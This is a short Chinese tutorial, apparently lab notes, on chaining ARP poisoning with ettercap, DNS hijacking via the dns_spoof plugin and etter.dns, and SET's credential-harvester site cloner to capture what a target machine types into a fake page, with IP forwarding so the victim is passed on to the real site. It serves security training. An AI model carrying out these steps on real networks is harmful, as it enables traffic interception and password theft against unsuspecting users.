

#### 思路

```
1.局域网arp欺骗（攻击机和靶机在同一局域网，靶机流量流经攻击机）
2.dns域名劫持（使用ettercap架设局域网dns服务器）
 靶机访问的网页域名指向攻击机配置的dns
3.网站克隆（使用set社工学套件）
 cd /usr/share/set
 ./setoolkit
 设置选项，开启apache服务
4.靶机测试
 访问网页，实际访问的是攻击机的apache虚假网页
 靶机输入的数据被攻击机获取
```



#### 步骤

1. arp攻击，将流量引向攻击机

   ```
   a.在kali里启动:嗅探/欺骗->ettercap-g
   b.菜单sniff扫描，选择当前kali使用的网卡
   c.菜单scan->scan forhost，扫描出局域网机器
   d.靶机ip添加到target1，网关ip添加到target2
   d.菜单Mitm->arp poisoning，勾选remote connection
   
   e.检查arp攻击是否成功（靶机查看arp表，检查是否网关指向攻击机mac)
   ```

2. dns域名劫持

   ```
   a.编辑dns劫持内容 （此步在ettercap-g开启前设置）
   vim /etc/ettercap/etter.dns，如下：
   xxx.com A 10.1.1.10			
   b.开启dns欺骗泛红
    在ettercap-g工具，菜单plugin->manage the plugins->dns_spoof,双击开启
    
   c.检查域名劫持是否成功（靶机ping网站，查看ip是否为攻击机ip地址）
   ```

3. 网站克隆

   ```
   a.启动set
    cd /usr/share/set
    ./setoolkit
   b.选项选择步骤：
    第一步选：social engineering attacks (社会工程学攻击)
    第二步选：website attack vectors (网页欺骗攻击)
    第三步选：credential harvester attack method (网页克隆攻击)
    第四步选：site cloner （单个站点克隆）
    根据提示：输入攻击机的ip地址
    根据提示：输入克隆的网页地址
    开始克隆中...(根据提示开启apache服务，也会提示捕获钓鱼数据直接打印或存放目录:/var/www)
   
   c.在靶机测试
   
   [d.攻击机最好确认开启路由转发功能，可使靶机第二次重定向到真实域名正常上网]
    vim /etc/sysctl.conf
    #net.ipv4.ip_forward=1		#将此句前#号去掉
   ```

   